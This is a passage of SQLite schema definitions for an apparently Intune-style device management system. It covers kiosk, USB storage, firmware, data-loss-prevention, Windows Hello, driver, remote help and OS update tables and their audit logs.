      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 58. DEVICE_NETWORK_POSTURE — Workstation Wi-Fi & VPN adapter inventory and signal telemetry
    CREATE TABLE IF NOT EXISTS device_network_posture (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      connected_ssid TEXT DEFAULT '',
      bssid TEXT DEFAULT '',
      signal_quality_pct INTEGER DEFAULT 0,
      radio_type TEXT DEFAULT '',
      channel INTEGER DEFAULT 0,
      active_adapters_json TEXT DEFAULT '[]',
      configured_profiles_json TEXT DEFAULT '[]',
      active_vpns_json TEXT DEFAULT '[]',
      ipv4_address TEXT DEFAULT '',
      ipv4_gateway TEXT DEFAULT '',
      dns_servers_json TEXT DEFAULT '[]',
      compliance_status TEXT DEFAULT 'COMPLIANT' CHECK(compliance_status IN ('COMPLIANT', 'NON_COMPLIANT', 'WARNING')),
      last_scanned_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 59. KIOSK_PROFILES — Kiosk Mode & Multi-App Assigned Access Profiles (Shell Launcher & Edge Kiosk)
    CREATE TABLE IF NOT EXISTS kiosk_profiles (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT DEFAULT '',
      kiosk_mode TEXT NOT NULL DEFAULT 'SINGLE_APP' CHECK(kiosk_mode IN ('SINGLE_APP', 'MULTI_APP', 'SHELL_LAUNCHER', 'DIGITAL_SIGNAGE')),
      target_group_id TEXT DEFAULT 'grp-all',
      logon_type TEXT NOT NULL DEFAULT 'AUTO_LOGON' CHECK(logon_type IN ('AUTO_LOGON', 'LOCAL_USER', 'AZURE_AD_USER')),
      user_account TEXT DEFAULT 'KioskUser0',
      app_type TEXT NOT NULL DEFAULT 'EDGE_BROWSER' CHECK(app_type IN ('EDGE_BROWSER', 'UWP_AUMID', 'WIN32_EXE', 'MULTI_APP_XML')),
      app_path_or_aumid TEXT DEFAULT '',
      edge_kiosk_type TEXT DEFAULT 'DIGITAL_SIGNAGE' CHECK(edge_kiosk_type IN ('DIGITAL_SIGNAGE', 'PUBLIC_BROWSING', 'FULL_SCREEN_INTERACTIVE')),
      edge_kiosk_url TEXT DEFAULT 'https://localpilot.internal',
      edge_idle_timeout_min INTEGER DEFAULT 5,
      allowed_apps_json TEXT DEFAULT '[]',
      custom_layout_xml TEXT DEFAULT '',
      disable_taskbar INTEGER DEFAULT 1 CHECK(disable_taskbar IN (0, 1)),
      disable_cad_keys INTEGER DEFAULT 1 CHECK(disable_cad_keys IN (0, 1)),
      restart_on_exit INTEGER DEFAULT 1 CHECK(restart_on_exit IN (0, 1)),
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 60. DEVICE_KIOSK_STATUS — Workstation Assigned Access & Shell Launcher runtime posture
    CREATE TABLE IF NOT EXISTS device_kiosk_status (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      profile_id TEXT,
      assigned_access_supported INTEGER DEFAULT 1 CHECK(assigned_access_supported IN (0, 1)),
      shell_launcher_supported INTEGER DEFAULT 1 CHECK(shell_launcher_supported IN (0, 1)),
      current_shell TEXT DEFAULT 'explorer.exe',
      kiosk_active INTEGER DEFAULT 0 CHECK(kiosk_active IN (0, 1)),
      active_kiosk_user TEXT DEFAULT '',
      lockdown_status TEXT DEFAULT 'STANDARD_SHELL' CHECK(lockdown_status IN ('STANDARD_SHELL', 'KIOSK_ACTIVE', 'KIOSK_CONFIGURED', 'LOCKDOWN_DRIFT')),
      last_scanned_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(profile_id) REFERENCES kiosk_profiles(id) ON DELETE SET NULL
    );

    -- 61. STORAGE_ACCESS_POLICIES — Removable Storage Access Control & USB Peripheral Governance
    CREATE TABLE IF NOT EXISTS storage_access_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT DEFAULT '',
      target_group_id TEXT DEFAULT 'grp-all',
      removable_disk_access TEXT NOT NULL DEFAULT 'ALLOW_ALL' CHECK(removable_disk_access IN ('ALLOW_ALL', 'READ_ONLY', 'DENY_ALL', 'DENY_UNENCRYPTED')),
      require_bitlocker_to_go INTEGER DEFAULT 1 CHECK(require_bitlocker_to_go IN (0, 1)),
      block_wpd_devices INTEGER DEFAULT 0 CHECK(block_wpd_devices IN (0, 1)),
      block_bluetooth INTEGER DEFAULT 0 CHECK(block_bluetooth IN (0, 1)),
      allowed_hardware_ids_json TEXT DEFAULT '[]',
      audit_only INTEGER DEFAULT 0 CHECK(audit_only IN (0, 1)),
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 62. DEVICE_REMOVABLE_STORAGE_STATUS — Workstation connected USB drives & BitLocker To Go posture
    CREATE TABLE IF NOT EXISTS device_removable_storage_status (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      policy_id TEXT,
      connected_removable_drives_json TEXT DEFAULT '[]',
      active_usb_devices_json TEXT DEFAULT '[]',
      write_access_denied INTEGER DEFAULT 0 CHECK(write_access_denied IN (0, 1)),
      compliance_status TEXT DEFAULT 'COMPLIANT' CHECK(compliance_status IN ('COMPLIANT', 'NON_COMPLIANT', 'UNENCRYPTED_USB_DETECTED', 'BLOCKED_DEVICE_DETECTED')),
      last_audit_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(policy_id) REFERENCES storage_access_policies(id) ON DELETE SET NULL
    );

    -- 63. REMOVABLE_STORAGE_EVENTS — USB Drive Insertion, Block, & Write Denied Audit Ledger
    CREATE TABLE IF NOT EXISTS removable_storage_events (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      event_type TEXT NOT NULL CHECK(event_type IN ('DRIVE_INSERTED', 'DRIVE_REMOVED', 'WRITE_BLOCKED', 'UNENCRYPTED_DRIVE_INSERTED')),
      drive_letter TEXT DEFAULT '',
      volume_name TEXT DEFAULT '',
      hardware_id TEXT DEFAULT '',
      is_encrypted INTEGER DEFAULT 0 CHECK(is_encrypted IN (0, 1)),
      action_taken TEXT NOT NULL DEFAULT 'ALLOWED' CHECK(action_taken IN ('ALLOWED', 'ENFORCED_READ_ONLY', 'BLOCKED')),
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 64. DELIVERY_OPTIMIZATION_POLICIES — Intune Delivery Optimization & P2P Peering Configuration
    CREATE TABLE IF NOT EXISTS delivery_optimization_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT DEFAULT '',
      target_group_id TEXT DEFAULT 'grp-all',
      download_mode TEXT NOT NULL DEFAULT 'LAN_PEER' CHECK(download_mode IN ('HTTP_ONLY', 'LAN_PEER', 'GROUP_PEER', 'INTERNET_PEER', 'SIMPLE', 'BYPASS')),
      group_id_guid TEXT DEFAULT '',
      max_cache_size_pct INTEGER DEFAULT 20,
      min_disk_size_gb INTEGER DEFAULT 32,
      min_ram_capacity_gb INTEGER DEFAULT 4,
      min_file_size_mb INTEGER DEFAULT 10,
      max_background_download_pct INTEGER DEFAULT 0,
      max_foreground_download_pct INTEGER DEFAULT 0,
      max_upload_bandwidth_kbps INTEGER DEFAULT 0,
      monthly_upload_cap_gb INTEGER DEFAULT 50,
      cache_retention_days INTEGER DEFAULT 7,
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 65. DEVICE_DELIVERY_OPTIMIZATION_STATUS — Workstation P2P Cache, Bandwidth Savings & Peering Posture
    CREATE TABLE IF NOT EXISTS device_delivery_optimization_status (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      policy_id TEXT,
      download_mode_active TEXT NOT NULL DEFAULT 'LAN_PEER',
      bytes_downloaded_http INTEGER DEFAULT 0,
      bytes_downloaded_p2p INTEGER DEFAULT 0,
      bytes_uploaded_p2p INTEGER DEFAULT 0,
      p2p_efficiency_pct REAL DEFAULT 0.0,
      active_peers_count INTEGER DEFAULT 0,
      cache_size_bytes INTEGER DEFAULT 0,
      cache_file_count INTEGER DEFAULT 0,
      last_audit_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(policy_id) REFERENCES delivery_optimization_policies(id) ON DELETE SET NULL
    );

    -- 66. DELIVERY_OPTIMIZATION_CONTENT_LOG — Windows Update, App & Package P2P Transfer Audit
    CREATE TABLE IF NOT EXISTS delivery_optimization_content_log (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      file_hash TEXT DEFAULT '',
      content_type TEXT NOT NULL DEFAULT 'WINDOWS_UPDATE' CHECK(content_type IN ('WINDOWS_UPDATE', 'WINGET_APP', 'MICROSOFT_STORE', 'DEFENDER_SIGNATURE', 'OTHER')),
      file_size_bytes INTEGER NOT NULL DEFAULT 0,
      bytes_from_peers INTEGER NOT NULL DEFAULT 0,
      bytes_from_http INTEGER NOT NULL DEFAULT 0,
      peer_source_ip TEXT DEFAULT '',
      duration_ms INTEGER DEFAULT 0,
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 67. DFCI_POLICIES — Intune Device Firmware Configuration Interface & UEFI Policies
    CREATE TABLE IF NOT EXISTS dfci_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT DEFAULT '',
      target_group_id TEXT DEFAULT 'grp-all',
      cameras_enabled INTEGER DEFAULT 1 CHECK(cameras_enabled IN (0, 1)),
      microphones_enabled INTEGER DEFAULT 1 CHECK(microphones_enabled IN (0, 1)),
      radios_enabled INTEGER DEFAULT 1 CHECK(radios_enabled IN (0, 1)),
      external_media_boot_enabled INTEGER DEFAULT 1 CHECK(external_media_boot_enabled IN (0, 1)),
      network_adapter_boot_enabled INTEGER DEFAULT 1 CHECK(network_adapter_boot_enabled IN (0, 1)),
      prevent_user_bios_changes INTEGER DEFAULT 0 CHECK(prevent_user_bios_changes IN (0, 1)),
      require_secure_boot INTEGER DEFAULT 1 CHECK(require_secure_boot IN (0, 1)),
      require_tpm2 INTEGER DEFAULT 1 CHECK(require_tpm2 IN (0, 1)),
      require_kernel_dma INTEGER DEFAULT 0 CHECK(require_kernel_dma IN (0, 1)),
      require_vbs INTEGER DEFAULT 0 CHECK(require_vbs IN (0, 1)),
      uefi_password_protection TEXT DEFAULT 'NONE' CHECK(uefi_password_protection IN ('NONE', 'ADMIN_PASSWORD', 'SYSTEM_PASSWORD')),
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 68. DEVICE_DFCI_STATUS — Workstation UEFI Firmware, TPM, Secure Boot & Hardware Root-of-Trust Posture
    CREATE TABLE IF NOT EXISTS device_dfci_status (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      policy_id TEXT,
      bios_vendor TEXT DEFAULT '',
      bios_version TEXT DEFAULT '',
      bios_release_date TEXT DEFAULT '',
      uefi_version TEXT DEFAULT '',
      secure_boot_enabled INTEGER DEFAULT 0 CHECK(secure_boot_enabled IN (0, 1)),
      tpm_present INTEGER DEFAULT 0 CHECK(tpm_present IN (0, 1)),
      tpm_version TEXT DEFAULT '',
      tpm_ready INTEGER DEFAULT 0 CHECK(tpm_ready IN (0, 1)),
      tpm_manufacturer TEXT DEFAULT '',
      kernel_dma_protection INTEGER DEFAULT 0 CHECK(kernel_dma_protection IN (0, 1)),
      vbs_status TEXT DEFAULT 'NOT_CONFIGURED',
      hvci_status TEXT DEFAULT 'NOT_CONFIGURED',
      hardware_readiness_score INTEGER DEFAULT 0,
      cameras_state TEXT DEFAULT 'ENABLED',
      microphones_state TEXT DEFAULT 'ENABLED',
      radios_state TEXT DEFAULT 'ENABLED',
      external_boot_state TEXT DEFAULT 'ENABLED',
      network_boot_state TEXT DEFAULT 'ENABLED',
      compliance_status TEXT NOT NULL DEFAULT 'COMPLIANT' CHECK(compliance_status IN ('COMPLIANT', 'NON_COMPLIANT', 'SECUREBOOT_DISABLED', 'TPM_MISSING', 'UNAUDITED')),
      last_audit_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(policy_id) REFERENCES dfci_policies(id) ON DELETE SET NULL
    );

    -- 69. DFCI_AUDIT_LOG — Firmware Configuration, Hardware Root-of-Trust Changes & Tamper Audit
    CREATE TABLE IF NOT EXISTS dfci_audit_log (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      event_type TEXT NOT NULL CHECK(event_type IN ('FIRMWARE_AUDIT', 'POLICY_APPLIED', 'SECUREBOOT_VIOLATION', 'TPM_STATUS_CHANGE', 'HARDWARE_TAMPER_ALERT', 'BOOT_MEDIA_BLOCKED')),
      setting_name TEXT NOT NULL,
      old_value TEXT DEFAULT '',
      new_value TEXT DEFAULT '',
      details TEXT DEFAULT '',
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 70. WIP_POLICIES — Windows Information Protection (WIP) & Endpoint Data Loss Prevention (DLP)
    CREATE TABLE IF NOT EXISTS wip_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT DEFAULT '',
      target_group_id TEXT DEFAULT 'grp-all',
      enforcement_level TEXT NOT NULL DEFAULT 'SILENT' CHECK(enforcement_level IN ('BLOCK', 'OVERRIDE', 'SILENT', 'OFF')),
      enterprise_domain TEXT NOT NULL DEFAULT 'localpilot.internal',
      protected_apps_json TEXT NOT NULL DEFAULT '[]',
      network_boundaries_json TEXT NOT NULL DEFAULT '[]',
      allow_user_decryption INTEGER DEFAULT 0 CHECK(allow_user_decryption IN (0, 1)),
      show_wip_overlays INTEGER DEFAULT 1 CHECK(show_wip_overlays IN (0, 1)),
      revoke_on_unenroll INTEGER DEFAULT 1 CHECK(revoke_on_unenroll IN (0, 1)),
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 71. DEVICE_WIP_STATUS — Workstation Corporate Data Protection & Exfiltration Posture
    CREATE TABLE IF NOT EXISTS device_wip_status (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      policy_id TEXT,
      enforcement_active TEXT NOT NULL DEFAULT 'SILENT' CHECK(enforcement_active IN ('BLOCK', 'OVERRIDE', 'SILENT', 'OFF')),
      protected_files_count INTEGER DEFAULT 0,
      encrypted_bytes INTEGER DEFAULT 0,
      managed_apps_count INTEGER DEFAULT 0,
      clipboard_violations_24h INTEGER DEFAULT 0,
      cloud_exfiltration_attempts_24h INTEGER DEFAULT 0,
      compliance_status TEXT NOT NULL DEFAULT 'COMPLIANT' CHECK(compliance_status IN ('COMPLIANT', 'NON_COMPLIANT', 'POLICY_DRIFT', 'UNAUDITED')),
      last_audit_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(policy_id) REFERENCES wip_policies(id) ON DELETE SET NULL
    );

    -- 72. WIP_AUDIT_LOG — Data Loss Prevention, Clipboard Exfiltration & Corporate Access Ledger
    CREATE TABLE IF NOT EXISTS wip_audit_log (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      event_type TEXT NOT NULL CHECK(event_type IN ('DATA_BLOCKED', 'USER_OVERRIDE', 'EXFILTRATION_ATTEMPT', 'ENTERPRISE_FILE_ACCESSED', 'POLICY_APPLIED', 'CLIPBOARD_PASTE_BLOCKED')),
      app_name TEXT NOT NULL,
      target_location TEXT DEFAULT '',
      file_name TEXT DEFAULT '',
      user_justification TEXT DEFAULT '',
      details TEXT DEFAULT '',
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 73. WHFB_POLICIES — Windows Hello for Business & FIDO2 Passwordless Authentication Governance
    CREATE TABLE IF NOT EXISTS whfb_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT NULL,
      state TEXT DEFAULT 'ENABLED' CHECK(state IN ('ENABLED', 'DISABLED', 'NOT_CONFIGURED')),
      min_pin_length INTEGER DEFAULT 6,
      max_pin_length INTEGER DEFAULT 127,
      pin_uppercase TEXT DEFAULT 'ALLOWED' CHECK(pin_uppercase IN ('ALLOWED', 'REQUIRED', 'DISALLOWED')),
      pin_lowercase TEXT DEFAULT 'ALLOWED' CHECK(pin_lowercase IN ('ALLOWED', 'REQUIRED', 'DISALLOWED')),
      pin_special_chars TEXT DEFAULT 'ALLOWED' CHECK(pin_special_chars IN ('ALLOWED', 'REQUIRED', 'DISALLOWED')),
      pin_digits TEXT DEFAULT 'REQUIRED' CHECK(pin_digits IN ('ALLOWED', 'REQUIRED', 'DISALLOWED')),
      pin_expiration_days INTEGER DEFAULT 0,
      pin_history_count INTEGER DEFAULT 0,
      allow_biometrics INTEGER DEFAULT 1,
      require_enhanced_anti_spoofing INTEGER DEFAULT 1,
      use_tpm_only INTEGER DEFAULT 1,
      allow_fido2_security_keys INTEGER DEFAULT 1,
      enabled INTEGER DEFAULT 1,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 74. DEVICE_WHFB_STATUS — Workstation Windows Hello Enrollment, TPM Attestation & FIDO2 Posture
    CREATE TABLE IF NOT EXISTS device_whfb_status (
      id TEXT PRIMARY KEY,
      device_id TEXT UNIQUE NOT NULL,
      policy_id TEXT DEFAULT NULL,
      whfb_enrolled INTEGER DEFAULT 0,
      whfb_provisioning_state TEXT DEFAULT 'NOT_ENROLLED' CHECK(whfb_provisioning_state IN ('ENROLLED', 'NOT_ENROLLED', 'PREREQUISITES_FAILED', 'DISABLED')),
      tpm_present INTEGER DEFAULT 0,
      tpm_ready INTEGER DEFAULT 0,
      biometrics_available INTEGER DEFAULT 0,
      face_auth_configured INTEGER DEFAULT 0,
      fingerprint_auth_configured INTEGER DEFAULT 0,
      pin_complexity_compliant INTEGER DEFAULT 1,
      fido2_keys_count INTEGER DEFAULT 0,
      anti_spoofing_active INTEGER DEFAULT 0,
      compliance_status TEXT DEFAULT 'NOT_ENROLLED' CHECK(compliance_status IN ('COMPLIANT', 'NOT_ENROLLED', 'NON_COMPLIANT')),
      last_audit_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(policy_id) REFERENCES whfb_policies(id) ON DELETE SET NULL
    );

    -- 75. WHFB_AUDIT_LOG — Hello for Business Provisioning, Biometrics & FIDO2 Event Ledger
    CREATE TABLE IF NOT EXISTS whfb_audit_log (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      event_type TEXT NOT NULL CHECK(event_type IN ('PIN_PROVISIONED', 'PIN_RESET', 'BIOMETRIC_ENROLLED', 'FIDO2_KEY_REGISTERED', 'AUTH_FAILURE', 'POLICY_APPLIED', 'SPOOF_ATTEMPT_BLOCKED')),
      credential_type TEXT DEFAULT 'PIN' CHECK(credential_type IN ('PIN', 'FACE', 'FINGERPRINT', 'FIDO2_KEY', 'TPM_ATTESTATION')),
      user_name TEXT DEFAULT '',
      status TEXT DEFAULT 'SUCCESS' CHECK(status IN ('SUCCESS', 'FAILURE', 'BLOCKED')),
      details TEXT DEFAULT '',
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 76. DRIVER_UPDATE_POLICIES — Windows Driver & Firmware Update Profiles (WUfB Driver Policies)
    CREATE TABLE IF NOT EXISTS driver_update_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT 'grp-all',
      approval_method TEXT DEFAULT 'MANUAL' CHECK(approval_method IN ('AUTOMATIC', 'MANUAL')),
      automatic_approval_delay_days INTEGER DEFAULT 7,
      allow_optional_drivers INTEGER DEFAULT 1,
      enabled INTEGER DEFAULT 1,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 77. FLEET_DRIVER_CATALOG — Discovered & Recommended OEM Driver Catalog
    CREATE TABLE IF NOT EXISTS fleet_driver_catalog (
      id TEXT PRIMARY KEY,
      driver_name TEXT NOT NULL,
      driver_class TEXT NOT NULL CHECK(driver_class IN ('DISPLAY', 'NET', 'MEDIA', 'SYSTEM', 'FIRMWARE', 'BLUETOOTH', 'STORAGE', 'OTHER')),
      driver_provider TEXT NOT NULL,
      driver_version TEXT NOT NULL,
      driver_date TEXT DEFAULT '',
      hardware_id TEXT DEFAULT '',
      approval_status TEXT DEFAULT 'PENDING_REVIEW' CHECK(approval_status IN ('APPROVED', 'PENDING_REVIEW', 'DECLINED', 'SUSPENDED')),
      approved_at TEXT,
      approved_by TEXT DEFAULT '',
      applicable_devices_count INTEGER DEFAULT 0,
      installed_devices_count INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    -- 78. DEVICE_DRIVER_STATUS — Per-Workstation Driver Inventory, Alignment & Update State
    CREATE TABLE IF NOT EXISTS device_driver_status (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      driver_id TEXT NOT NULL,
      current_version TEXT NOT NULL,
      install_status TEXT DEFAULT 'INSTALLED' CHECK(install_status IN ('INSTALLED', 'NEEDS_UPDATE', 'UPDATING', 'FAILED', 'REBOOT_REQUIRED')),
      last_scanned_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(driver_id) REFERENCES fleet_driver_catalog(id) ON DELETE CASCADE,
      UNIQUE(device_id, driver_id)
    );

    -- 79. REMOTE_HELP_SESSIONS — Microsoft Intune Remote Help & Unattended Assistance Sessions
    CREATE TABLE IF NOT EXISTS remote_help_sessions (
      id TEXT PRIMARY KEY,
      session_code TEXT NOT NULL,
      device_id TEXT NOT NULL,
      sharer_user TEXT DEFAULT '',
      helper_user TEXT NOT NULL,
      session_type TEXT NOT NULL CHECK(session_type IN ('FULL_CONTROL', 'VIEW_ONLY', 'ELEVATION')),
      status TEXT NOT NULL CHECK(status IN ('PENDING', 'ACTIVE', 'COMPLETED', 'EXPIRED', 'CANCELLED')),
      unattended_enabled INTEGER DEFAULT 0 CHECK(unattended_enabled IN (0, 1)),
      session_key_hash TEXT DEFAULT '',
      started_at TEXT,
      ended_at TEXT,
      expires_at TEXT NOT NULL,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 80. REMOTE_HELP_ROLES — Role-Based Access Control for Remote Assistance Operators
    CREATE TABLE IF NOT EXISTS remote_help_roles (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      can_request_full_control INTEGER DEFAULT 1 CHECK(can_request_full_control IN (0, 1)),
      can_request_elevation INTEGER DEFAULT 0 CHECK(can_request_elevation IN (0, 1)),
      can_unattended INTEGER DEFAULT 0 CHECK(can_unattended IN (0, 1)),
      target_group_id TEXT DEFAULT NULL,
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 81. REMOTE_HELP_AUDIT_LOG — Security & Session Audit Ledger for Remote Operations
    CREATE TABLE IF NOT EXISTS remote_help_audit_log (
      id TEXT PRIMARY KEY,
      session_id TEXT DEFAULT NULL,
      device_id TEXT NOT NULL,
      actor_user TEXT NOT NULL,
      action TEXT NOT NULL CHECK(action IN ('SESSION_REQUESTED', 'SESSION_STARTED', 'CONTROL_GRANTED', 'ELEVATION_TRIGGERED', 'SESSION_TERMINATED', 'UNATTENDED_CONNECTED')),
      details TEXT DEFAULT '',
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(session_id) REFERENCES remote_help_sessions(id) ON DELETE SET NULL
    );

    -- 82. FEATURE_UPDATE_POLICIES — Target OS Version Pinning & Staged Feature Rollouts
    CREATE TABLE IF NOT EXISTS feature_update_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT NULL,
      target_os_version TEXT NOT NULL,
      rollout_type TEXT DEFAULT 'IMMEDIATELY' CHECK(rollout_type IN ('IMMEDIATELY', 'SPECIFIC_DATE', 'GRADUAL')),
      rollout_start_date TEXT,
      rollout_end_date TEXT,
      days_between_groups INTEGER DEFAULT 0,
      safeguard_holds_enabled INTEGER DEFAULT 1 CHECK(safeguard_holds_enabled IN (0, 1)),
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 83. EXPEDITED_QUALITY_UPDATES — Emergency Zero-Day Patching & Maintenance Window Overrides
    CREATE TABLE IF NOT EXISTS expedited_quality_updates (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT NULL,
      target_kb_number TEXT NOT NULL,
      cve_reference TEXT DEFAULT '',
      min_os_version TEXT DEFAULT '',
      days_until_forced_reboot INTEGER DEFAULT 1,
      override_active_hours INTEGER DEFAULT 1 CHECK(override_active_hours IN (0, 1)),
      status TEXT DEFAULT 'ACTIVE' CHECK(status IN ('ACTIVE', 'PAUSED', 'EXPIRED', 'COMPLETED')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 84. DEVICE_FEATURE_UPDATE_STATUS — Workstation Target Version Alignment & Expedited Patch Posture
    CREATE TABLE IF NOT EXISTS device_feature_update_status (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      feature_policy_id TEXT DEFAULT NULL,
      expedited_update_id TEXT DEFAULT NULL,
      current_os_version TEXT NOT NULL,
      current_os_build TEXT NOT NULL,
      target_os_version TEXT DEFAULT '',
      feature_update_status TEXT DEFAULT 'UP_TO_DATE' CHECK(feature_update_status IN ('OFFERING', 'INSTALLING', 'PENDING_REBOOT', 'UP_TO_DATE', 'SAFEGUARD_HOLD', 'ERROR')),
      expedited_install_status TEXT DEFAULT 'NOT_APPLICABLE' CHECK(expedited_install_status IN ('NOT_APPLICABLE', 'PENDING', 'DOWNLOADING', 'INSTALLING', 'PENDING_REBOOT', 'COMPLETED', 'FAILED')),
      safeguard_hold_reasons TEXT DEFAULT '',
      last_scanned_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
